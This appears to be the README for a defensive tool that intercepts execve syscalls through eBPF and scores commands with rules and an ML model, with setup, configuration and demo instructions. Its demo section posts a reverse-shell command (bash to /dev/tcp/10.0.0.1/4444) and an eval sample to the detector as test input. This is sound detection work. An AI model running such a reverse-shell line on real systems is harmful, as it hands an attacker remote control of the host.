# 🛡️ AI Bouncer + Kernel Guard

> **Real-time RCE prevention** — eBPF kernel hooks + ML detection + live dashboard.

AI Bouncer intercepts every `execve` syscall at the kernel level, runs it through a rule engine + ML model, and surfaces the result in a live React dashboard — all within a few milliseconds.

---

## 📋 Table of Contents

1. [How It Works](#how-it-works)
2. [Prerequisites](#prerequisites)
3. [Setup & Installation](#setup--installation)
4. [Running the System](#running-the-system)
5. [Running the Demo](#running-the-demo)
6. [Configuration Reference](#configuration-reference)
7. [Ownership Modes](#ownership-modes)
8. [Testing](#testing)
9. [Docs](#docs)

---

## How It Works

```
execve syscall → eBPF kernel hook → Detection Pipeline → WebSocket → Dashboard
                                         │
                              Rule Engine (60%) + ML Scorer (40%)
                                         │
                              Risk Score 0–100 → safe / suspicious / malicious
```

On **Windows / macOS**: The kernel hook is unavailable. Use `POST /analyze` or the demo script to send commands manually — the detection pipeline is fully functional.

---

## Prerequisites

Make sure you have these installed before starting:

| Tool | Version | Install |
|---|---|---|
| Python | 3.10+ | [python.org](https://www.python.org/downloads/) |
| Node.js | 18+ | [nodejs.org](https://nodejs.org/) |
| conda (optional) | any | [miniconda](https://docs.conda.io/en/latest/miniconda.html) |
| Git | any | [git-scm.com](https://git-scm.com/) |

> **WSL users**: Run all Python/backend commands inside your WSL terminal. The frontend can run on Windows or WSL.

---

## Setup & Installation

### Step 1 — Clone the repo

```bash
git clone https://github.com/your-org/kernal_ai_bouncer.git
cd kernal_ai_bouncer
```

### Step 2 — Create and activate Python environment

```bash
# Using conda (recommended)
conda create -n aibouncer python=3.11 -y
conda activate aibouncer

# OR using venv
python -m venv .venv
source .venv/bin/activate   # Linux/macOS/WSL
# .venv\Scripts\activate    # Windows PowerShell
```

### Step 3 — Install Python dependencies

```bash
pip install -r requirements.txt
```

### Step 4 — Set up environment variables

```bash
# Copy the example env file
cp .env.example .env

# The defaults work for local dev — no changes needed unless you're deploying
```

### Step 5 — Install frontend dependencies

```bash
cd frontend
cp .env.example .env   # frontend config (sets VITE_API_URL)
npm install
cd ..
```

---

## Running the System

You need **two terminals** running at the same time.

### Terminal 1 — Start the Backend

```bash
conda activate aibouncer  # (or source .venv/bin/activate)
python -m uvicorn backend.app:app --host 0.0.0.0 --port 8000
```

You should see the startup banner:
```
==================================================
🚀 Starting AI Bouncer backend...
   Platform:      linux
   Owner Mode:    backend
   API URL:       http://0.0.0.0:8000
   WebSocket URL: ws://0.0.0.0:8000/ws
   Kernel Active: NO   (YES on Linux with eBPF support)
==================================================
✅ Backend ready!
```

Verify it's alive:
```bash
curl http://localhost:8000/healthz
# {"status": "ok"}
```

### Terminal 2 — Start the Frontend Dashboard

```bash
cd frontend
npm run dev
```

Open **[http://localhost:5173](http://localhost:5173)** in your browser.

You should see the dashboard with:
- ✅ **Backend: Online** pill in the top-right
- ✅ **WebSocket: Connected** pill
- 🛡️ **Remediation: OFF** toggle (leave OFF unless on Linux with eBPF)

---

## Running the Demo

With both services running, open a third terminal and run:

```bash
bash scripts/demo.sh
```

The script will walk you through three detection stages with pauses so you can point to the dashboard between each:

1. **Stage 1: Benign** — `ls -la /var/log` → classified `safe`
2. **Stage 2: Suspicious** — `eval $(cat /tmp/script.sh)` → classified `suspicious`
3. **Stage 3: Malicious** — reverse shell attempt → classified `malicious`

> Press `Enter` between stages to advance. Watch the dashboard update live!

**Quick manual test** (no script):
```bash
# Linux/macOS/WSL
curl -s -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}' | python3 -m json.tool

# Windows PowerShell
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/analyze" `
  -ContentType "application/json" `
  -Body '{"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}'
```

---

## Configuration Reference

All config is driven by `.env` at the project root and `frontend/.env`.

### Backend (`.env`)

| Variable | Default | Description |
|---|---|---|
| `KERNEL_MONITOR_OWNER` | `backend` | Who owns eBPF hooks: `backend`, `agent`, or `disabled` |
| `API_HOST` | `0.0.0.0` | Host the backend binds to |
| `API_PORT` | `8000` | Port the backend listens on |
| `API_LOG_LEVEL` | `info` | Uvicorn log level |
| `FRONTEND_ORIGINS` | `http://localhost:5173,...` | Comma-separated CORS-allowed origins |
| `DB_PATH` | `data/events.db` | SQLite database path (auto-absolutified) |
| `EVENT_CACHE_SIZE` | `1000` | Max in-memory events |
| `BACKEND_URL` | `http://localhost:8000` | URL agent uses to forward events |
| `AGENT_EVENT_TIMEOUT` | `5` | Agent HTTP request timeout (seconds) |

### Frontend (`frontend/.env`)

| Variable | Default | Description |
|---|---|---|
| `VITE_API_URL` | `http://localhost:8000` | Backend base URL used by all frontend API calls |

---

## Ownership Modes

The `KERNEL_MONITOR_OWNER` env var controls who attaches the eBPF hooks. This prevents duplicate kernel event capture.

| Mode | Who runs eBPF | Use when |
|---|---|---|
| `backend` **(default)** | FastAPI backend process | Running backend directly |
| `agent` | Agent sidecar process | Running agent as standalone service |
| `disabled` | Nobody | Windows / macOS / testing without kernel |

> ⚠️ **Never set both backend and agent to run eBPF simultaneously** — you will get duplicate events.

---

## Testing

```bash
# Run all tests
python -m pytest tests/ -v

# Run a specific test file
python -m pytest tests/test_kernel_owner.py -v
```

Expected output: **5 passing** (ownership mode + queue handoff tests).

---

## Docs

| Doc | Purpose |
|---|---|
| [`docs/API.md`](docs/API.md) | All endpoints, request/response shapes, WebSocket protocol |
| [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) | System diagram, component breakdown, detection pipeline |
| [`docs/archive/`](docs/archive/) | Historical build logs and roadmap notes |
